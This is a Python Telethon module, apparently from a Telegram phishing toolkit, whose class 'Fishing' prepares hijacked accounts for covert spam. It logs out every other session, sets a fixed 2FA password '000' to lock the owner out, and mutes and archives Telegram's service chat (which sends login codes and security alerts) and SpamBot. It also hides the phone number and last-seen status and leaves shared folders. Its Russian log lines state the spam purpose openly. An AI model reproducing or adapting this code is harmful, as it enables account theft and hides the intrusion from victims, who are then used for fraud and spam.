from telethon.errors import *
from telethon.tl.functions.account import SetPrivacyRequest, UpdateNotifySettingsRequest, ResetNotifySettingsRequest
from telethon.tl.functions.auth import ResetAuthorizationsRequest
from telethon.tl.functions.messages import ToggleDialogPinRequest
from telethon.tl.types import *
from telethon.tl import functions
from datetime import datetime
from core.account import TelegramAccount

def _plain(v):
    if hasattr(v, 'text'):
        return v.text
    elif isinstance(v, str):
        return v
    elif v is None:
        return "Без названия"
    else:
        return str(v)

class Fishing:
    @staticmethod
    async def prepare_account(telegram_account: TelegramAccount, add_2fa: bool):
        telegram_account.log_state('Готовлю аккаунт к скрытому спаму.')
        client = telegram_account.telegram_client
        
        if add_2fa:
            try:
                telegram_account.log('Выхожу из всех сессий.')
                await client(ResetAuthorizationsRequest())
            except (TimeoutError, FreshResetAuthorisationForbiddenError):
                telegram_account.log_warning('Не удалось выйти из всех сессий.')

            try:
                telegram_account.log('Добавляю облачный пароль (2fa).')
                await client.edit_2fa(new_password='000')
            except NewSaltInvalidError:
                telegram_account.log('Salt хэша нового пароля недействителен.')
            except PasswordHashInvalidError:
                telegram_account.log_warning('На аккаунте уже есть пароль.')
            except TimeoutError:
                telegram_account.log_warning('Превышено время ожидания при добавлении пароля.')

        try:
            telegram_account.log('Настраиваю уведомления и приватность.')
            await client(ResetNotifySettingsRequest())
            
            # Disable all notifications
            mute_settings = InputPeerNotifySettings(
                show_previews=False, 
                mute_until=datetime(2026, 4, 22), 
                sound=NotificationSoundDefault(),
                stories_muted=False, 
                stories_hide_sender=False, 
                stories_sound=NotificationSoundDefault()
            )
            
            for peer_type in [InputNotifyUsers(), InputNotifyChats(), InputNotifyBroadcasts()]:
                await client(UpdateNotifySettingsRequest(peer=peer_type, settings=mute_settings))

            privacy_rules = [
                (InputPrivacyKeyPhoneNumber(), [InputPrivacyValueDisallowAll()]),
                (InputPrivacyKeyStatusTimestamp(), [InputPrivacyValueDisallowAll()]),
                (InputPrivacyKeyProfilePhoto(), [InputPrivacyValueAllowContacts()]),
                (InputPrivacyKeyAbout(), [InputPrivacyValueAllowAll()]),
                (InputPrivacyKeyForwards(), [InputPrivacyValueDisallowAll()]),
                (InputPrivacyKeyPhoneCall(), [InputPrivacyValueDisallowAll()]),
                (InputPrivacyKeyChatInvite(), [InputPrivacyValueDisallowAll()])
            ]
            
            for key, rules in privacy_rules:
                await client(SetPrivacyRequest(key=key, rules=rules))

            service_settings = InputPeerNotifySettings(
                show_previews=False, 
                mute_until=datetime(2026, 1, 1), 
                sound=NotificationSoundDefault()
            )
            
            telegram_account.log('Скрываю уведомления от чата Telegram.')
            try:
                await client(UpdateNotifySettingsRequest(peer=777000, settings=service_settings))
            except:
                pass
            
            telegram_account.log('Скрываю уведомления от чата Replies.')
            
            telegram_account.log('Скрываю уведомления от чата SpamBot.')
            try:
                await client(UpdateNotifySettingsRequest(peer='SpamBot', settings=service_settings))
            except:
                pass

            try:
                await client.edit_folder('Replies', 1)
                telegram_account.log('Добавляю Replies в архив.')
            except (ValueError, PeerIdInvalidError):
                pass

            telegram_account.log('Добавляю Telegram (диалог) в архив.')
            try:
                await client.edit_folder(777000, 1)
            except:
                pass

            telegram_account.log('Добавляю SpamBot в архив.')
            try:
                await client.edit_folder('SpamBot', 1)
            except:
                pass

            telegram_account.log('Закрепляю диалоги.')
            dialogs = await client.get_dialogs(folder=0)
            pinned_count = 0
            
            for dialog in dialogs[:5]:
                if not dialog.pinned:
                    try:
                        await client(ToggleDialogPinRequest(peer=dialog.entity, pinned=True))
                        pinned_count += 1
                    except PinnedDialogsTooMuchError:
                        break
                    except:
                        pass

            try:
                filters = await client(functions.messages.GetDialogFiltersRequest())
                for f in filters.filters:
                    if isinstance(f, DialogFilterChatlist):
                        await client(functions.chatlists.LeaveChatlistRequest(
                            chatlist=InputChatlistDialogFilter(filter_id=f.id), 
                            peers=f.include_peers
                        ))
                        telegram_account.log(f'({_plain(dialog_filter.title)}) Покинул папку.')
            except:
                pass

        except FloodWaitError as e:
            telegram_account.log_warning(f'Флудвейт: {e.seconds}с')
        except Exception as e:
            telegram_account.log_error(f"Ошибка подготовки: {e.__class__.__name__}")